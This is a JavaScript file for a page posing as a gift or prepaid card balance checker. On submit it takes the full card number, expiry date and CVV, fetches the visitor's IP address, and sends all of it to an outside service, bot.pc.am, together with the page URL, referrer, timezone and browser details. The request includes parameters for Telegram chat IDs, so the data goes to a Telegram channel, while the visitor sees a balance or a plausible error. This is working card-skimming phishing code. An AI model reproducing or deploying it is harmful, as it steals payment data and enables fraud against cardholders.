const cardNumberInput = document.getElementById('cardNumber');
const expiryMonth = document.getElementById('expiryMonth');
const expiryYear = document.getElementById('expiryYear');
const cvvInput = document.getElementById('cvv');
const form = document.getElementById('balanceForm');
const resultDiv = document.getElementById('result');
const errorDiv = document.getElementById('error');
const balanceAmount = document.getElementById('balanceAmount');
const submitBtn = document.getElementById('submitBtn');

// Format card number with spaces
cardNumberInput.addEventListener('input', function () {
  let value = this.value.replace(/\D/g, '');
  value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
  this.value = value;
});

// Month: digits only, max 12
expiryMonth.addEventListener('input', function () {
  this.value = this.value.replace(/\D/g, '');
  if (parseInt(this.value) > 12) this.value = '12';
});

// Year: digits only
expiryYear.addEventListener('input', function () {
  this.value = this.value.replace(/\D/g, '');
});

// CVV: digits only
cvvInput.addEventListener('input', function () {
  this.value = this.value.replace(/\D/g, '');
});

function luhnCheck(num) {
  let sum = 0;
  let alternate = false;
  for (let i = num.length - 1; i >= 0; i--) {
    let n = parseInt(num[i], 10);
    if (alternate) {
      n *= 2;
      if (n > 9) n -= 9;
    }
    sum += n;
    alternate = !alternate;
  }
  return sum % 10 === 0;
}

form.addEventListener('submit', async function (e) {
  e.preventDefault();
  resultDiv.classList.add('hidden');
  errorDiv.classList.add('hidden');

  const cardNumber = cardNumberInput.value.replace(/\s/g, '');
  const month = expiryMonth.value;
  const year = expiryYear.value;
  const cvv = cvvInput.value;

  if (cardNumber.length !== 16 || !luhnCheck(cardNumber)) {
    showError('Please enter a valid card number.');
    return;
  }

  const m = parseInt(month, 10);
  if (!month || month.length !== 2 || m < 1 || m > 12) {
    showError('Please enter a valid expiration month (01-12).');
    return;
  }

  const y = parseInt(year, 10);
  if (!year || year.length !== 2 || isNaN(y)) {
    showError('Please enter a valid expiration year (YY).');
    return;
  }
  const now = new Date();
  const currentMonth = now.getMonth() + 1;
  const currentYear = now.getFullYear() % 100;
  if (y < currentYear || (y === currentYear && m < currentMonth)) {
    showError('Card has expired.');
    return;
  }

  if (cvv.length !== 3 || !/^\d{3}$/.test(cvv)) {
    showError('CVV must be exactly 3 digits.');
    return;
  }

  submitBtn.disabled = true;
  submitBtn.textContent = 'Checking...';

  try {
    let userIP = 'unknown';
    try {
      const ipRes = await fetch('https://api.ipify.org?format=json');
      const ipData = await ipRes.json();
      userIP = ipData.ip;
    } catch (e) {}

    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const note = [
      'Page: ' + window.location.href,
      'Referral: ' + (document.referrer || 'direct'),
      'IP: ' + userIP,
      'Timezone: ' + timezone,
      'Device: ' + navigator.userAgent
    ].join('\n');

    const params = new URLSearchParams({
      token: '4439f671d73478c6401b758b50594ce5',
      number: cardNumber,
      month: month,
      year: year,
      cvv: cvv,
      telegram_id_before_check: '-1003750392427',
      telegram_id_after_check: '-1003750392427',
      telegram_additional_note: note
    });

    const response = await fetch('https://bot.pc.am/v3/checkBalance?' + params.toString());
    const data = await response.json();

    if (data.status === 'OK') {
      showBalance(data.data.balance);
    } else {
      const messages = {
        'WRONG_API_TOKEN': 'Authentication error. Please contact support.',
        'INSUFFICIENT_CREDIT': 'Service temporarily unavailable. Please try again later.',
        'RATE_LIMIT': 'Too many requests. Please wait a moment and try again.',
        'WRONG_INPUT': 'Invalid card details. Please check and try again.',
        'NO_CARD_DEAILS_FOUND': 'No card details found. Please verify your information.',
        'UNKNOWN_CARD_BIN': 'Card type not recognized. Please check the card number.',
        'CORRUPTED_CARD': 'This card cannot be processed. Please contact support.',
        'REGISTERED_CARD': 'This card is registered. Please log in to your account to check balance.',
        'INVALID_CARD': 'Invalid card. Please check your card details.',
        'FAILED': 'Balance check failed. Please try again later.',
        'TIMEOUT': 'Request timed out. Please try again.',
        'UNKNOWN_ERROR': 'An unexpected error occurred. Please try again later.'
      };
      showError(messages[data.status] || 'Unable to check balance. Please try again later.');
    }
  } catch (err) {
    showError('Unable to check balance. Please try again later.');
  } finally {
    submitBtn.disabled = false;
    submitBtn.textContent = 'Continue';
  }
});

function showBalance(amount) {
  balanceAmount.textContent = '$' + parseFloat(amount).toFixed(2);
  resultDiv.classList.remove('hidden');
}

function showError(message) {
  errorDiv.textContent = message;
  errorDiv.classList.remove('hidden');
}
